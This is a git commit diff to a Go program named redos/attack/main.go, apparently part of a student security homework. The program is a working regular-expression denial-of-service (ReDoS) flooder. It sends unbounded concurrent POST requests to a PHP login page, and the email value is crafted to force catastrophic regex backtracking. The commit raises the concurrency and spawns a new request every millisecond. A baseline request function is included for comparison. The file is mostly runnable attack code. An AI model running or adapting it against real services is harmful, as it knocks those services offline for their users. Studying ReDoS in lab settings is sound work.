111701ca905788bd865bca6576bf59dbe405e889
zhangxinyue <xinyuez018@gmail.com>
2020-03-22 14:07:50 +0800

    make compare lib experiment

--- redos/attack/main.go
+++ redos/attack/main.go
@@ -7,34 +7,55 @@ import (
 	"net/http"
 	"net/url"
 	"sync"
+	"time"
 )
 
 var wg sync.WaitGroup
 
 func main() {
-	// requestUrl := "http://10.0.2.6/Homework3/final/index.php"
-	requestUrl := "http://10.0.2.131/Homework3/redos/index.php"
-	concurrentRequester := 20
+	requestUrl := "http://10.0.2.6/Homework3/final/index.php"
+	//requestUrl := "http://10.0.2.131/Homework3/redos/index.php"
+	concurrentRequester := 50
 	for i := 0; i < concurrentRequester; i++ {
 		wg.Add(1)
-		go func() {
+		go func(requestUrl string) {
 			defer wg.Done()
 			for {
-				formValue := url.Values{
-					"email":    {"aaaaaaaaaaaaaaaaaaaaaaaax"},
-					"password": {"aaaaaaaaa"},
-				}
-				response, err := http.PostForm(requestUrl, formValue)
-				if err != nil {
-					log.Println(err.Error())
-				}else{
-					defer response.Body.Close()
-					body, _ := ioutil.ReadAll(response.Body)
-					fmt.Println(string(body))
-				}
+				go makeAttackRequest(requestUrl)
+				time.Sleep(time.Millisecond)
 			}
-		}()
+		}(requestUrl)
 	}
 	wg.Wait()
 	fmt.Println("done")
+}
+
+func makeAttackRequest(requestUrl string) {
+	formValue := url.Values{
+		"email":    {"aaaaaaaaaaaaaaaaaaaaaaaax"},
+		"password": {"aaaaaaaaa"},
+	}
+	response, err := http.PostForm(requestUrl, formValue)
+	if err != nil {
+		log.Println(err.Error())
+	} else {
+		defer response.Body.Close()
+		body, _ := ioutil.ReadAll(response.Body)
+		fmt.Println(string(body))
+	}
+}
+
+func makeNormalRequest(requestUrl string) {
+	formValue := url.Values{
+		"email":    {"aaaaaaaaaaaaaaaaaaaaaaaaa"},
+		"password": {"aaaaaaaaa"},
+	}
+	response, err := http.PostForm(requestUrl, formValue)
+	if err != nil {
+		log.Println(err.Error())
+	} else {
+		defer response.Body.Close()
+		body, _ := ioutil.ReadAll(response.Body)
+		fmt.Println(string(body))
+	}
 }
